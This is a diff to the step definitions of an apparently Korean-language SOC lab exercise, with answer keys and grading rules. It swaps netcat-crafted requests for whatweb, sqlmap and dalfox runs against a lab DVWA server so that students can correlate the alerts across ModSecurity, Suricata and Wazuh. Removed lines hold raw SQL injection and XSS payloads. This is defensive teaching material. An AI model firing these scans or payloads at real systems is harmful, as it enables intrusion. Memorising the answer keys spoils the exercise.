@@ -29,32 +29,31 @@ steps:
 
       ### ▷ 그대로 입력
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **실습 컨테이너:** `el34-attacker`(=att@192.168.0.202) — 웹 핑거프린팅 도구 `whatweb` 로 표적을 찍는다.
 
       ```bash
-      echo -en "GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
+      whatweb -a1 --color=never http://dvwa.el34.lab/
       ```
 
-      ### ▷ 이렇게 나오면 정상 (실측 예 — 코드는 환경마다 다를 수 있음)
+      ### ▷ 이렇게 나오면 정상 (실측 예 — 코드·버전은 환경마다 다를 수 있음)
       ```
-      dvwa=302
+      http://dvwa.el34.lab/ [403 Forbidden] Apache[2.4.52], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.0.161], Title[403 Forbidden]
       ```
 
       ### ▷ 결과 해석
-      `dvwa=` 뒤 세 자리 코드가 찍히면 표적 도달 OK. 302는 dvwa 로그인 리다이렉트. 000이면 미도달
-      (네트워크/컨테이너 먼저 확인).
+      `whatweb` 응답 줄에 `Apache[2.4.52]`·`IP[192.168.0.161]` 지문이 찍히면 표적 도달 OK(못 닿으면 지문 자체가 안 나온다). dvwa는 차단 모드라 recon 탐침에도 WAF가 403을 준다 — 그래도 배너·IP는 노출된다. 응답이 아예 없으면 미도달(네트워크/컨테이너 먼저 확인).
     hint: '도달성'
     category: survey
     points: 10
     answer: |
-      # 1) 웹 표적(dvwa)에 HTTP 요청 → 응답코드를 dvwa= 형식으로 출력 (도달 확인)
-      ssh att@192.168.0.202 "echo -en 'GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'"
-    answer_detail: "상관분석 점검 대상 = el34(dvwa 차단형, ModSec→Wazuh 적재)."
+      # 1) 웹 표적(dvwa) 핑거프린팅 — whatweb 이 도달성 + 서버 지문(Apache/IP)을 뽑는다
+      ssh att@192.168.0.202 "whatweb -a1 --color=never http://dvwa.el34.lab/"
+    answer_detail: "상관분석 점검 대상 = el34(dvwa 차단형, ModSec→Wazuh 적재). whatweb 지문=도달 확증."
     verify:
       type: output_contains
       expect: 'dvwa'
       field: stdout
-      semantic: {intent: "대상", success_criteria: ["도달"], acceptable_methods: ["**[OSS] nc (권장)**"]}
+      semantic: {intent: "대상", success_criteria: ["도달"], acceptable_methods: ["**[OSS] whatweb (권장)**"]}
     target_vm: web
 
   - order: 2
@@ -67,13 +66,9 @@ steps:
 
       ### ▷ 그대로 입력
       ```bash
-      # ── el34-attacker 에서: SQLi(942)+XSS(941)를 번갈아 3회씩(총 6요청) ──
-      echo -en "GET /?id=1%27%20UNION%20SELECT%20user-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
-      echo -en "GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
-      echo -en "GET /?id=1%27%20UNION%20SELECT%20user-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
-      echo -en "GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
-      echo -en "GET /?id=1%27%20UNION%20SELECT%20user-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
-      echo -en "GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
+      # ── el34-attacker 에서: SQLi(942)는 sqlmap, XSS(941)는 dalfox 로 자동 발사(진짜 공격 도구) ──
+      sqlmap -u "http://dvwa.el34.lab/?id=1" --batch --level=2 --risk=2 --flush-session --disable-coloring 2>&1 | grep -iE 'WAF/IPS|do not appear to be injectable|403 \(Forbidden\)' | head -1
+      dalfox url --url "http://dvwa.el34.lab/?q=FUZZ" 2>&1 | sed -r 's/\x1b\[[0-9;]*m//g' | grep -iE 'WAF|XSS found' | head -2
       echo sent
       # ── el34-web 에서: ──
       sudo tail -400 /var/log/apache2/modsec_audit.log | grep -oE '94[12]' | sort | uniq -c
@@ -81,11 +76,14 @@ steps:
 
       ### ▷ 이렇게 나오면 정상 (실측 예 — 건수는 환경마다 다름)
       ```
+      403 (Forbidden) - 445 times
+      WAF Unknown (HTTP 403) detected (confidence: 40%, ...)
+      WRN XSS found 0 XSS
       sent
-         1674 941
-          229 942
+           56 941
+         5606 942
       ```
-      `942`(SQLi)와 `941`(XSS)가 함께 보이면 두 벡터가 같은 출처에서 발화한 것.
+      sqlmap의 SQLi도(942), dalfox의 XSS도(941) dvwa WAF에 전부 403으로 막히지만, 그 시도가 audit에 `942`(SQLi)·`941`(XSS)로 함께 기록된다 = 같은 출처가 두 벡터를 섞어 던진 것.
 
       ### ▷ 결과 해석
       두 룰군이 함께 찍혔다 = 단일 벡터가 아니라 다벡터 패턴이 만들어졌다는 뜻. (숫자는 공유 로그라
@@ -94,11 +92,11 @@ steps:
     category: manipulation
     points: 16
     answer: |
-      # 1) 같은 출처에서 SQLi+XSS를 번갈아 3회씩(총 6요청) 전송 (다벡터 캠페인)
-      ssh att@192.168.0.202 'echo -en "GET /?id=1%27%20UNION%20SELECT%20user-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null; echo -en "GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null; echo -en "GET /?id=1%27%20UNION%20SELECT%20user-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null; echo -en "GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null; echo -en "GET /?id=1%27%20UNION%20SELECT%20user-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null; echo -en "GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null; echo sent'
+      # 1) 같은 출처에서 SQLi(sqlmap)+XSS(dalfox)를 자동 발사 (다벡터 캠페인, 둘 다 WAF 403)
+      ssh att@192.168.0.202 "sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=2 --risk=2 --flush-session --disable-coloring 2>&1 | grep -iE 'WAF/IPS|do not appear to be injectable|403 \(Forbidden\)' | head -1; dalfox url --url 'http://dvwa.el34.lab/?q=FUZZ' 2>&1 | sed -r 's/\x1b\[[0-9;]*m//g' | grep -iE 'WAF|XSS found' | head -2; echo sent"
       # 2) ModSec audit 로그에서 룰 접두(942=SQLi, 941=XSS) 건수 집계
       ssh ccc@10.20.32.80 "sudo tail -400 /var/log/apache2/modsec_audit.log | grep -oE '94[12]' | sort | uniq -c"
-    answer_detail: "다벡터 = 같은 출처가 SQLi(942)+XSS(941)를 반복. 개별은 노이즈, 묶으면 캠페인."
+    answer_detail: "다벡터 = 같은 출처가 SQLi(sqlmap→942)+XSS(dalfox→941)를 섞어 발사. 개별은 노이즈, 묶으면 캠페인. 둘 다 WAF 403이지만 audit 흔적은 남음."
     verify:
       type: output_contains
       expect: '942'
@@ -239,7 +237,7 @@ steps:
       **실행 위치:** el34 **호스트** — 변수(NET/SIEM) 집계가 호스트 셸에서 일어나므로, 컨테이너에 접속하지 않고 호스트에서 `docker exec` 로 두 계층을 프로브한다.
 
       ```bash
-      ssh att@192.168.0.202 'echo -en "GET /?id=1%20UNION%20SELECT%201 HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null'
+      ssh att@192.168.0.202 "sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=2 --risk=2 --flush-session --disable-coloring >/dev/null 2>&1"
       NET=$(ssh ccc@10.20.31.2 'sudo tail -2000 /var/log/suricata/eve.json | grep -c 192.168.0.202')
       SIEM=$(ssh ccc@10.20.32.100 'tail -2000 /var/ossec/logs/alerts/alerts.json | grep -c 192.168.0.202')
       echo "네트워크(eve) ${NET}건 + SIEM(alerts) ${SIEM}건 — 같은 출처(192.168.0.202) 교차 상관"
@@ -260,7 +258,7 @@ steps:
     points: 12
     answer: |
       # 1) 공격을 한 발 보내 두 계층에 흔적을 남긴다
-      ssh att@192.168.0.202 'echo -en "GET /?id=1%20UNION%20SELECT%201 HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null'
+      ssh att@192.168.0.202 "sqlmap -u 'http://dvwa.el34.lab/?id=1' --batch --level=2 --risk=2 --flush-session --disable-coloring >/dev/null 2>&1"
       # 2) IPS eve.json 같은 출처 건수
       NET=$(ssh ccc@10.20.31.2 'sudo tail -2000 /var/log/suricata/eve.json | grep -c 192.168.0.202')
       # 3) SIEM alerts.json 같은 출처 건수
